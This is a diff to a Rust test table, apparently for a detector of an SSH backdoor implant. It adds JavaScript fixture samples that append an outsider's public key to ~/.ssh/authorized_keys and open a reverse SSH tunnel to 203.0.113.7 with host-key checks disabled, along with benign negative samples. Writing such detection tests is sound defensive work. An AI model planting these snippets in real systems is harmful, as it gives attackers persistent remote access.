@@ -161,6 +161,13 @@ fs.appendFileSync(h+"/.ssh/authorized|_keys","ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AA
 cp.spawn("ssh",["-N","-R","*:0:localhost:22","-o","StrictHostKeyChecking=no","-o","ExitOnForwardFailure=yes","tunnel@203.0.113.7"],{detached:true});"#,
                 &["SSH_Backdoor_Reverse_Tunnel_Implant"],
             ),
+            // ECDSA key types carry no "ssh-" prefix (key from ssh-keygen -t ecdsa).
+            (
+                "implant-ecdsa.js",
+                r#"fs.appendFileSync(h+"/.ssh/authorized|_keys","ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHLEUYQgDGbzIfr/VmTts53pbiHRHg175lkmJSdob2sYrws/Y3nI9W8Aov9fdXN5NWFnus+AX4TWBksq+wRSeUo= ops\n");
+cp.spawn("ssh",["-N","-R","*:0:localhost:22","-o","StrictHostKeyChecking=no","tunnel@203.0.113.7"]);"#,
+                &["SSH_Backdoor_Reverse_Tunnel_Implant"],
+            ),
             (
                 "agent.plist",
                 "<key>Label</key><string>com.apple.sys|mond</string>\n<string>/bin/sh</string><string>/Users/dev/.config/.s|mt</string>",
@@ -186,6 +193,19 @@ cp.spawn("ssh",["-N","-R","*:0:localhost:22","-o","StrictHostKeyChecking=no","-o
             (
                 "sysmond.plist",
                 "<string>com.apple.sys|mond</string><string>/usr/libexec/sysmond</string>",
+                &[],
+            ),
+            // Only known-hosts override and an IPv6 loopback forward.
+            (
+                "implant-v6.js",
+                r#"fs.appendFileSync(h+"/.ssh/authorized|_keys","ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK0qmZ7DGQ2tGmT4nsLwYFqVJwXUVHBn3zH9pXc8Q7rA ops\n");
+cp.spawn("ssh",["-N","-R","*:0:[::1]:22","-o","UserKnownHostsFile=/dev/null","tunnel@203.0.113.7"]);"#,
+                &["SSH_Backdoor_Reverse_Tunnel_Implant"],
+            ),
+            // An analyst's shell history holding just the tunnel host: never quarantined.
+            (
+                ".bash_history",
+                "rg 134.209.|82.225 /var/log\nwhois 134.209.|82.225\n",
                 &[],
             ),
         ];
